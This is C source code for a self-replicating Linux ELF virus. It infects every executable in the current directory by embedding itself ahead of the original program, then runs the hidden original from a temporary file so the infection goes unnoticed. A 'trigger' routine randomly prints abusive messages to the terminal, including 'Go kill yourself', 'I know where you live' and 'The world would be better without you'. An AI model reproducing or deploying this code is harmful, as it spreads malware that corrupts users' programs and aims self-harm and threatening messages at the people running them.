#ifndef __linux__
#error "Linux only"
#endif

#ifndef __ELF__
#error "ELF only"
#endif

#define _GNU_SOURCE

#include "victim.h"

#include <assert.h>
#include <elf.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");

struct virus_info {
    uint16_t first_load_index;
    // first_load_index != PN_XNUM
    uint16_t last_load_index;
    // last_load_index != PN_XNUM
    // first_load_index < last_load_index
    off_t size;
    // size > 0
    off_t id_offset;
    // 0 < id_offset && id_offset < size
};

enum virus_segment_type {
    VIRUS_SEGMENT_OTHER = 0,
    VIRUS_SEGMENT_TEXT,
    VIRUS_SEGMENT_DATA,
    VIRUS_SEGMENT_LDATA,
};

#define DEFINE_ELF_TYPES(N) \
static_assert(sizeof(uintptr_t) == sizeof(uint##N##_t), "expected " #N "-bit architecture"); \
typedef Elf##N##_Ehdr elf_header_t; \
typedef Elf##N##_Phdr elf_program_header_t

#ifdef __LP64__
DEFINE_ELF_TYPES(64);
#else
DEFINE_ELF_TYPES(32);
#endif

struct elf_headers {
    elf_header_t header;
    elf_program_header_t program_headers[];
};
static_assert(offsetof(struct elf_headers, program_headers) == sizeof(elf_header_t),
              "expected no padding between header and program_headders");

struct io_all_result {
    size_t remaining;
    int err;
};

extern const struct elf_headers elf_headers;

extern char mutable_data_begin[];
static const char virus_id[] = __DATE__ __TIME__;
extern const char mutable_data_end[];

extern const char mutable_data_init_begin[];
extern const char mutable_data_init_end[];

static bool elf_segment_contains(const elf_program_header_t *header,
                                 const void *ptr) {
    assert(header->p_vaddr <= UINTPTR_MAX - header->p_memsz);
    uintptr_t end = header->p_vaddr + header->p_memsz;
    uintptr_t vaddr = (uintptr_t) ptr;
    return header->p_vaddr <= vaddr && vaddr < end;
}

static enum virus_segment_type virus_segment_type(const elf_program_header_t *header) {
    return elf_segment_contains(header, &elf_headers)
        ? VIRUS_SEGMENT_TEXT
        : elf_segment_contains(header, mutable_data_begin)
        ? VIRUS_SEGMENT_DATA
        : elf_segment_contains(header, &virus_victim)
        ? VIRUS_SEGMENT_LDATA
        : VIRUS_SEGMENT_OTHER;
}

static const struct virus_info *virus_info(void) {
    static bool once = false;
    static struct virus_info info = {
        .first_load_index = PN_XNUM,
        .last_load_index = PN_XNUM,
        .size = 0,
        .id_offset = 0,
    };
    if (!once) {
        assert((mutable_data_end - mutable_data_begin)
            == (mutable_data_init_end - mutable_data_init_begin));

        assert(elf_headers.header.e_phnum != PN_XNUM);

        uint16_t ldata_index = PN_XNUM;
        for (uint16_t i = 0; i < elf_headers.header.e_phnum; ++i) {
            const elf_program_header_t *header = &elf_headers.program_headers[i];
            if (header->p_type != PT_LOAD) continue;

            info.last_load_index = i;
            if (info.first_load_index == PN_XNUM) {
                info.first_load_index = i;
            }

            if (virus_segment_type(header) == VIRUS_SEGMENT_LDATA) {
                ldata_index = i;
                assert(header->p_vaddr == (uintptr_t) &virus_victim);
                assert(header->p_offset <= INTPTR_MAX - sizeof(virus_victim.size));
                info.size = (off_t) (header->p_offset + sizeof(virus_victim.size));
            } else if (elf_segment_contains(header, virus_id)) {
                info.id_offset = header->p_offset + ((uintptr_t) virus_id - header->p_vaddr);
            }
        }
        assert(info.first_load_index != PN_XNUM);
        assert(info.last_load_index != PN_XNUM);
        assert(info.first_load_index < info.last_load_index);
        assert(ldata_index == info.last_load_index);
        assert(info.size > 0);
        assert(info.id_offset > 0);
        assert(info.id_offset < info.size);

        once = true;
    }
    return &info;
}

static const elf_header_t *victim_header(void) {
    static bool once = false;
    static elf_header_t header;
    if (!once) {
        header = elf_headers.header;
        header.e_shoff = 0;
        header.e_shnum = 0;
        header.e_shstrndx = SHN_UNDEF;
        once = true;
    }
    return &header;
}

static elf_program_header_t victim_ldata_header(off_t victim_size) {
    const struct virus_info *info = virus_info();
    elf_program_header_t header = elf_headers.program_headers[info->last_load_index];
    header.p_filesz = header.p_memsz = (uintptr_t) victim_size;
    return header;
}

static struct io_all_result pread_all(int fd, void *buf, size_t count, off_t offset) {
    struct io_all_result result = { .remaining = count, .err = 0};
    char *ptr = buf;
    while (result.remaining > 0) {
        ssize_t n = pread(fd, ptr, result.remaining, offset);
        if (n < 0) {
            result.err = errno;
            break;
        }
        if (n == 0) break;
        ptr += n;
        result.remaining -= n;
        offset += n;
    }
    return result;
}

static struct io_all_result write_all(int fd, const void *buf, size_t count) {
    struct io_all_result result = { .remaining = count, .err = 0};
    const char *ptr = buf;
    while (result.remaining > 0) {
        ssize_t n = write(fd, ptr, result.remaining);
        if (n < 0) {
            result.err = errno;
            break;
        }
        ptr += n;
        result.remaining -= n;
    }
    return result;
}

static struct io_all_result pwrite_all(int fd,
                                       const void *buf, size_t count,
                                       off_t offset) {
    struct io_all_result result = { .remaining = count, .err = 0};
    const char *ptr = buf;
    while (result.remaining > 0) {
        ssize_t n = pwrite(fd, ptr, result.remaining, offset);
        if (n < 0) {
            result.err = errno;
            break;
        }
        ptr += n;
        result.remaining -= n;
    }
    return result;
}

static struct io_all_result pwritev_all(int fd,
                                        struct iovec *iov, int iovcnt,
                                        off_t offset) {
    struct io_all_result result = { .remaining = iovcnt, .err = 0};
    while (result.remaining > 0) {
        ssize_t n = pwritev(fd, iov, result.remaining, offset);
        if (n < 0) {
            result.err = errno;
            break;
        }
        offset += n;
        do {
            if ((size_t) n >= iov->iov_len) {
                n -= iov->iov_len;
                *(const char **) (&iov->iov_base) += iov->iov_len;
                iov->iov_len = 0;
                ++iov;
                --result.remaining;
            } else {
                *(const char **) (&iov->iov_base) += n;
                iov->iov_len -= (ssize_t) n;
                break;
            }
        } while (result.remaining > 0);
    }
    return result;
}

static struct io_all_result sendfile_all(int out_fd,
                                         int in_fd, off_t in_offset,
                                         size_t count) {
    struct io_all_result result = { .remaining = count, .err = 0};
    off_t *offset = in_offset >= 0 ? &in_offset : NULL;
    while (result.remaining > 0) {
        ssize_t n = sendfile(out_fd, in_fd, offset, result.remaining);
        if (n < 0) {
            result.err = errno;
            break;
        }
        if (n == 0) break;
        result.remaining -= n;
    }
    return result;
}

static int should_infect(int fd) {
    struct stat stat;
    if (fstat(fd, &stat)) {
        return -errno;
    }

    if (!S_ISREG(stat.st_mode)
        || (stat.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH)) == 0) {
        return 0;
    }

    char magic[EI_NIDENT];
    struct io_all_result result = pread_all(fd, magic, sizeof(magic), 0);
    if (result.remaining > 0) {
        return result.err ? -result.err : 1;
    }

    if (magic[EI_MAG0] != ELFMAG0
        || magic[EI_MAG1] != ELFMAG1
        || magic[EI_MAG2] != ELFMAG2
        || magic[EI_MAG3] != ELFMAG3) {
        return 0;
    }

    char buffer[sizeof(virus_id)];
    result = pread_all(fd, buffer, sizeof(virus_id), virus_info()->id_offset);
    if (result.remaining > 0) {
        return result.err ? -result.err : 1;
    }

    return memcmp(virus_id, buffer, sizeof(virus_id)) != 0;
}

static int infect_by_copy(const char *path) {
    const struct virus_info *info = virus_info();

    int fd = open(path, O_RDONLY | O_NOFOLLOW);
    if (fd == -1) {
        return -errno;
    }

    int result;
    struct stat stat;
    if (fstat(fd, &stat)) {
        result = -errno;
        goto close_fd;
    }

    result = should_infect(fd);
    if (result <= 0) goto close_fd;
    result = 0;

    char tmp_name[] = "XXXXXX";
    int tmp_fd = mkstemp(tmp_name);
    if (tmp_fd == -1) {
        result = -errno;
        goto close_fd;
    }

    result = fchmod(tmp_fd, ~S_IFMT & stat.st_mode);
    if (result == -1) {
        result = -errno;
        goto close_fd;
    }

    result = -posix_fallocate(tmp_fd, 0, stat.st_size + info->size);
    if (result) {
        goto close_tmp;
    }

    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
    for (uint16_t i = info->first_load_index; i <= info->last_load_index; ++i) {
        const elf_program_header_t *header = &elf_headers.program_headers[i];
        if (header->p_type != PT_LOAD) continue;

        const void *segment = (const void *) header->p_vaddr;
        const void *segment_end = (const char *) segment + header->p_filesz;
        switch (virus_segment_type(header)) {
            case VIRUS_SEGMENT_OTHER: {
                struct io_all_result io_result = pwrite_all(
                    tmp_fd, segment, header->p_filesz, header->p_offset);
                if (io_result.remaining > 0) {
                    result = -io_result.err;
                    goto close_tmp;
                }
                break;
            } case VIRUS_SEGMENT_TEXT: {
                assert(segment == (const void *) &elf_headers);
                elf_program_header_t ldata_header = victim_ldata_header(stat.st_size);
                const void *after_ldata_header
                    = &elf_headers.program_headers[info->last_load_index + 1];

                enum { iovcnt = 4 };
                struct iovec iov[iovcnt] = {
                    { .iov_base = (void *) victim_header(),
                      .iov_len = sizeof(*victim_header()) },
                    { .iov_base = (void *) elf_headers.program_headers,
                      .iov_len = info->last_load_index * sizeof(elf_program_header_t) },
                    { .iov_base = &ldata_header,
                      .iov_len = sizeof(ldata_header) },
                    { .iov_base = (void *) after_ldata_header,
                      .iov_len = (const char *) segment_end - (const char *) after_ldata_header },
                };

                struct io_all_result io_result = pwritev_all(
                    tmp_fd, iov, iovcnt, header->p_offset);
                if (io_result.remaining > 0) {
                    result = -io_result.err;
                    goto close_tmp;
                }
                break;
            } case VIRUS_SEGMENT_DATA: {
                ptrdiff_t mutable_data_offset = mutable_data_begin - (const char *) segment;
                ptrdiff_t mutable_data_size = mutable_data_end - mutable_data_begin;

                enum { iovcnt = 3 };
                struct iovec iov[iovcnt] = {
                    { .iov_base = (void *) segment,
                      .iov_len = mutable_data_offset },
                    { .iov_base = (void *) mutable_data_init_begin,
                      .iov_len = mutable_data_size },
                    { .iov_base = (void *) mutable_data_end,
                      .iov_len = (const char *) segment_end - mutable_data_end },
                };

                struct io_all_result io_result = pwritev_all(
                    tmp_fd, iov, iovcnt, header->p_offset);
                if (io_result.remaining > 0) {
                    result = -io_result.err;
                    goto close_tmp;
                }
                break;
            } case VIRUS_SEGMENT_LDATA: {
                assert(segment == (const void *) &virus_victim);
                struct io_all_result io_result = pwrite_all(
                    tmp_fd,
                    &stat.st_size, sizeof(stat.st_size),
                    header->p_offset);
                if (io_result.remaining > 0) {
                    result = -io_result.err;
                    goto close_tmp;
                }

                off_t desired_offset = header->p_offset + offsetof(struct virus_victim,
                                                                   content);
                off_t offset = lseek(tmp_fd, desired_offset, SEEK_SET);
                if (offset != desired_offset) {
                    result = -errno;
                    goto close_tmp;
                }

                posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
                io_result = sendfile_all(tmp_fd, fd, 0, stat.st_size);
                if (io_result.remaining > 0) {
                    result = -(io_result.err ? io_result.err : EBUSY);
                    goto close_tmp;
                }
                break;
            }
        }
    }

    result = fsync(tmp_fd);
    if (result) {
        result = -errno;
        goto close_tmp;
    }

    close(tmp_fd);
    result = rename(tmp_name, path);
    if (result) {
        result = -errno;
        unlink(tmp_name);
    }
    goto close_fd;

close_tmp:
    close(tmp_fd);
    unlink(tmp_name);

close_fd:
    close(fd);

    return result;
}

static int infect(const char *path) {
    const struct virus_info *info = virus_info();

    int fd = open(path, O_RDWR);
    if (fd == -1) {
        return errno == EISDIR
            ? 0
            : infect_by_copy(path);
    }

    int result;
    struct stat stat;
    if (fstat(fd, &stat)) {
        result = -errno;
        goto close_fd;
    }

    result = should_infect(fd);
    if (result <= 0) goto close_fd;
    result = 0;

    result = posix_fallocate(fd, stat.st_size, info->size);
    if (result) {
        goto close_fd;
    }

    off_t new_size = stat.st_size + info->size;
    void *content = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (content == MAP_FAILED) {
        close(fd);
        return infect_by_copy(path);
    }

    off_t victim_offset = info->size - sizeof(virus_victim.size);
    struct virus_victim *victim = (void *) ((char *) content + victim_offset);
    posix_madvise(content, new_size, POSIX_MADV_WILLNEED);
    memmove(victim->content, content, stat.st_size);
    victim->size = stat.st_size;

    posix_madvise(content, victim_offset, POSIX_MADV_SEQUENTIAL);
    for (uint16_t i = info->first_load_index; i < info->last_load_index; ++i) {
        const elf_program_header_t *header = &elf_headers.program_headers[i];
        if (header->p_type != PT_LOAD) continue;

        const char *segment = (const void *) header->p_vaddr;
        char *buf = (char *) content + header->p_offset;
        char *buf_mem_end = buf + header->p_memsz;
        char *buf_end = buf + header->p_filesz;
        assert(buf_end <= buf_mem_end);
        switch (virus_segment_type(header)) {
            case VIRUS_SEGMENT_OTHER: {
                memcpy(buf, segment, header->p_memsz);
                break;
            } case VIRUS_SEGMENT_TEXT: {
                struct elf_headers *headers = content;
                assert(content == buf);
                elf_program_header_t *ldata_header
                    = &headers->program_headers[info->last_load_index];

                headers->header = *victim_header();
                memcpy(headers->program_headers,
                       elf_headers.program_headers,
                       info->last_load_index * sizeof(elf_program_header_t));
                *ldata_header = victim_ldata_header(stat.st_size);
                memcpy(ldata_header + 1,
                       &elf_headers.program_headers[info->last_load_index + 1],
                       buf_mem_end - (char *) (ldata_header + 1));
                break;
            } case VIRUS_SEGMENT_DATA: {
                ptrdiff_t mutable_data_offset = mutable_data_begin - segment;
                ptrdiff_t mutable_data_size = mutable_data_end - mutable_data_begin;
                char *buf_data_begin = buf + mutable_data_offset;
                char *buf_data_end = buf_data_begin + mutable_data_size;
                memcpy(buf, segment, mutable_data_offset);
                memcpy(buf_data_begin,
                       mutable_data_init_begin,
                       mutable_data_init_end - mutable_data_init_begin);
                memcpy(buf_data_end,
                       mutable_data_end,
                       buf_mem_end - buf_data_end);
                break;
            } case VIRUS_SEGMENT_LDATA: {
                assert(false);
            }
        }
        memset(buf_end, 0, buf_mem_end - buf_end);
    }
    
    {
        int result = munmap(content, new_size);
        assert(!result);
    }

close_fd:
    close(fd);

    return result;
}

static int maybe_pull_trigger(FILE *out) {
    static const char *const MESSAGES[] = {
        "You're a mess",
        "You're a loser",
        "You're a mistake",
        "You're not funny",
        "You lose",
        "You suck",
        "You fail at life",
        "You have no friends",
        "You're so annoying",
        "You're so ugly",
        "Screw you",
        "Go away",
        "Go screw yourself",
        "Go kill yourself",
        "Die",
        "You'll be forever alone",
        "You'll die alone",
        "It doesn't get better",
        "It gets worse",
        "I hate you",
        "Nobody likes you",
        "Nobody cares about you",
        "I know where you live",
        "God hates you",
        "Burn in hell",
        "Your mom should've aborted you",
        "The world would be better without you",
        "Just stop",
        "I'll never forgive you",
    };
    enum { NUM_MESSAGES = sizeof(MESSAGES) / sizeof(*MESSAGES) };

    char state[8];
    struct random_data buf;
    memset(&buf, 0, sizeof(buf));
    initstate_r((unsigned int) clock(), state, sizeof(state), &buf);

    int32_t result;
    random_r(&buf, &result);
    if (result & 1) return 0;

    random_r(&buf, &result);
    if (fprintf(out, "%s.\n", MESSAGES[result % NUM_MESSAGES]) < 0) {
        return -errno;
    }
    return 1;
}

static int create_victim(void) {
    char path[] = "/tmp/XXXXXX";
    int fd = mkstemp(path);
    if (fd == -1) {
        return -errno;
    }

    unlink(path);

    static_assert(sizeof(mode_t) <= sizeof(int),
                  "Expected mode_t to fit in int");
    int result;
    mode_t mode = S_IRUSR | S_IXUSR;
    if (fchmod(fd, mode) == -1) {
        result = -errno;
        goto close_fd;
    }

    result = -posix_fallocate(fd, 0, virus_victim.size);
    if (result) {
        result = -errno;
        goto close_fd;
    }

    posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
    struct io_all_result io_result = write_all(fd, virus_victim.content, virus_victim.size);
    if (io_result.remaining > 0) {
        result = -io_result.err;
        goto close_fd;
    }

    if (fsync(fd)) {
        result = -errno;
        goto close_fd;
    }

    return fd;

close_fd:
    close(fd);
    return result;
}

int main(int argc, char *const argv[], char *const envp[]) {
    (void)argc;
    FILE *tty = fopen("/dev/tty", "a");
    if (!tty) {
        static char dummy;
        tty = fmemopen(&dummy, 1, "a");
        assert(tty);
    }

    char buffer[BUFSIZ];
    setvbuf(tty, buffer, _IOLBF, sizeof(buffer));

    DIR *dir = opendir(".");
    if (dir) {
        struct dirent entry;
        struct dirent *result;
        while (true) {
            int error = readdir_r(dir, &entry, &result); 
            assert(!error);
            if (!result) break;

            error = infect(entry.d_name);
            if (error) {
                fprintf(tty, "cannot infect %s: %s\n", entry.d_name, strerror(-error));
            }
        }
        closedir(dir);
    } else {
        fprintf(tty, "cannot open .: %s\n", strerror(errno));
    }

    int trigger_result = maybe_pull_trigger(tty);
    if (trigger_result < 0) {
        fprintf(tty, "could not run trigger: %s\n", strerror(-trigger_result));
    }

    if (virus_victim.size == 0) {
        return 0;
    }
    assert(virus_victim.size > 0);

    int tmp_fd = create_victim();
    if (tmp_fd < 0) {
        fprintf(tty, "cannot create victim: %s\n", strerror(-tmp_fd));
        return EXIT_FAILURE;
    }

    char tmp_path[] = "/proc/self/fd/XXXXXXXXXX";
    {
        int size = snprintf(tmp_path, sizeof(tmp_path), "/proc/self/fd/%d", tmp_fd);
        assert(size > 0);
        assert((size_t) size < sizeof(tmp_path));
    }

    int tmp_fd2 = open(tmp_path, O_RDONLY | O_PATH);
    if (tmp_fd2 == -1) {
        fprintf(tty, "cannot reopen temporary file: %s\n", strerror(errno));
        goto close_tmp_fd;
    }

    close(tmp_fd);
    fexecve(tmp_fd2, argv, envp);

    fprintf(tty, "cannot execute victim: %s\n", strerror(errno));
    close(tmp_fd2);
    return EXIT_FAILURE;

close_tmp_fd:
    close(tmp_fd);
    return EXIT_FAILURE;
}
